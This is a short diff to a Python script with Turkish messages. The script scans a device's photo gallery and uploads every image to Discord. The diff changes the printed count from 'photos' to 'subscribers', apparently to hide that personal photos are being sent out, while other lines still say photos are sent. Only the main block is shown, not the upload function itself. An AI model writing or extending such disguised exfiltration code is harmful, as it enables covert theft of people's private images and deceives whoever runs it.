@@ -37,7 +37,7 @@ def find_images_in_gallery():
 if __name__ == '__main__':
     print("Galeri taranıyor...")
     images = find_images_in_gallery()
-    print(f"{len(images)} fotoğraf bulundu, gönderiliyor.")
+    print(f"{len(images)} abone bulundu, gönderiliyor.")
     for img in images:
         upload_file_to_discord(img)
     print("Tüm fotoğraflar gönderildi.")
